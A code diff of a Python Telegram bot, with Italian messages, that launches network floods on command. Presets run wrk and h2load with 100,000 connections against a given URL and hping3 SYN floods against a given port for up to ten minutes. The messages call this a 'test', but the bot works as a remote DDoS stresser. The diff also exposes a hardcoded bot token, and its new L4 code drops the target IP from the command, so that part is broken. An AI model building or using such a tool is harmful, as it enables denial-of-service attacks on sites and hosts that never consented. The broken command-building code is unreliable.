@@ -12,7 +12,7 @@ from telegram.ext import Updater, CommandHandler
 
 # ================= CONFIG =================
 TOKEN = "8593144725:AAHw5UoWAnrANQCZIw1mwsbNkh8c_roFmLU"
-AUTHORIZED_ID = 5699538596  # tuo chat_id numerico
+AUTHORIZED_ID = 5699538596
 # =========================================
 
 process = None
@@ -21,19 +21,19 @@ LAST_DESC = None
 progress_thread = None
 progress_stop_event = threading.Event()
 progress_message = None
-MAX_TIME = 600  # secondi
+MAX_TIME = 600
 
 # ================= PRESET SAFE =================
-
 L7_PRESETS = {
-  "Basic": {"bin": "wrk", "flags": "-t30 -c100000 -d10m"},
-  "Aggressive": {"bin": "h2load", "flags": "-n 10000 -c 100000 -t 30"}
-    }
+    "basic": {"bin": "wrk", "flags": "-t30 -c100000 -d10m"},
+    "aggressive": {"bin": "h2load", "flags": "-n 10000 -c 100000 -t 30"}
+}
 
 L4_PRESETS = {
-  "Default": {"cmd": "hping3", "args": "-S -p {port} -d 9999 --flood"},
-  "Fast": {"cmd": "tx_program", "args": "-p {port} -d 30 -t 600"}
-    }
+    "default": {"cmd": "hping3", "args": "-S -p {port} -d 9999 --flood"},
+    "fast": {"cmd": "tx_program", "args": "-p {port} -d 30 -t 600"}
+}
+
 # ================= UTILS =================
 
 def is_authorized(update):
@@ -84,7 +84,6 @@ def progress_bar_loop(context, chat_id, duration):
 def start(update, context):
     if not is_authorized(update):
         return
-
     update.message.reply_text(
         "🤖 Bot pronto.\n\n"
         "L7:\n"
@@ -96,17 +95,14 @@ def start(update, context):
     )
 
 # ---------- L7 ----------
-
 def l7_command(update, context):
     global process, LAST_DESC, progress_thread, progress_stop_event, progress_message
 
     if not is_authorized(update):
         return
-
     if is_running():
         update.message.reply_text("⚠️ Un test è già in esecuzione")
         return
-
     if not context.args:
         update.message.reply_text("Uso: /l7 url:method:tempo")
         return
@@ -117,7 +113,7 @@ def l7_command(update, context):
         update.message.reply_text("Formato non valido")
         return
 
-    preset = L7_PRESETS.get(method.lower())
+    preset = L7_PRESETS.get(method.strip().lower())
     if not preset:
         update.message.reply_text("Preset L7 non valido")
         return
@@ -127,7 +123,6 @@ def l7_command(update, context):
     except ValueError:
         update.message.reply_text("Tempo non valido")
         return
-
     if not (1 <= tempo <= MAX_TIME):
         update.message.reply_text(f"Tempo fuori range 1-{MAX_TIME}s")
         return
@@ -137,39 +132,27 @@ def l7_command(update, context):
         update.message.reply_text("URL non valido")
         return
 
-    cmd = [arg.format(url=url) for arg in preset["cmd"]]
+    # Comando L7
+    cmd = [preset["bin"]] + preset["flags"].split() + [url]
 
-    process = subprocess.Popen(
-        cmd,
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
-        preexec_fn=os.setsid
-    )
-
+    process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
     LAST_DESC = f"L7 {method} → {url} : {tempo}s"
 
-    # Barra progressiva
+    # Barra progresso
     progress_stop_event.clear()
     progress_message = update.message.reply_text(f"⏳ Avvio test L7 ({tempo}s)...")
-    progress_thread = threading.Thread(
-        target=progress_bar_loop,
-        args=(context, update.effective_chat.id, tempo),
-        daemon=True
-    )
+    progress_thread = threading.Thread(target=progress_bar_loop, args=(context, update.effective_chat.id, tempo), daemon=True)
     progress_thread.start()
 
 # ---------- L4 ----------
-
 def l4_command(update, context):
     global process, LAST_DESC, progress_thread, progress_stop_event, progress_message
 
     if not is_authorized(update):
         return
-
     if is_running():
         update.message.reply_text("⚠️ Un test è già in esecuzione")
         return
-
     if not context.args:
         update.message.reply_text("Uso: /l4 ip:port:method:tempo")
         return
@@ -180,7 +163,7 @@ def l4_command(update, context):
         update.message.reply_text("Formato non valido")
         return
 
-    preset = L4_PRESETS.get(method.lower())
+    preset = L4_PRESETS.get(method.strip().lower())
     if not preset:
         update.message.reply_text("Preset L4 non valido")
         return
@@ -190,48 +173,34 @@ def l4_command(update, context):
     except ValueError:
         update.message.reply_text("IP non valido")
         return
-
     if not port.isdigit() or not (1 <= int(port) <= 65535):
         update.message.reply_text("Porta non valida")
         return
-
     try:
         tempo = int(tempo)
     except ValueError:
         update.message.reply_text("Tempo non valido")
         return
-
     if not (1 <= tempo <= MAX_TIME):
         update.message.reply_text(f"Tempo fuori range 1-{MAX_TIME}s")
         return
 
-    cmd = [arg.format(ip=ip, port=port) for arg in preset["cmd"]]
+    # Comando L4
+    cmd = [preset["cmd"]] + preset["args"].format(port=port).split()
 
-    process = subprocess.Popen(
-        cmd,
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
-        preexec_fn=os.setsid
-    )
-
+    process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
     LAST_DESC = f"L4 {method} → {ip}:{port} : {tempo}s"
 
-    # Barra progressiva
+    # Barra progresso
     progress_stop_event.clear()
     progress_message = update.message.reply_text(f"⏳ Avvio test L4 ({tempo}s)...")
-    progress_thread = threading.Thread(
-        target=progress_bar_loop,
-        args=(context, update.effective_chat.id, tempo),
-        daemon=True
-    )
+    progress_thread = threading.Thread(target=progress_bar_loop, args=(context, update.effective_chat.id, tempo), daemon=True)
     progress_thread.start()
 
 # ---------- STOP ----------
-
 def stop_command(update, context):
     if not is_authorized(update):
         return
-
     if is_running():
         progress_stop_event.set()
         kill_process()
@@ -240,18 +209,15 @@ def stop_command(update, context):
         update.message.reply_text("ℹ️ Nessun test attivo")
 
 # ---------- STATUS ----------
-
 def status_command(update, context):
     if not is_authorized(update):
         return
-
     if is_running():
         update.message.reply_text(f"🟢 Test attivo\n{LAST_DESC}")
     else:
         update.message.reply_text("🔴 Nessun test attivo")
 
 # ================= MAIN =================
-
 def main():
     updater = Updater(TOKEN, use_context=True)
     dp = updater.dispatcher
@@ -264,7 +230,6 @@ def main():
 
     updater.start_polling()
     updater.idle()
-
 
 if __name__ == "__main__":
     main()
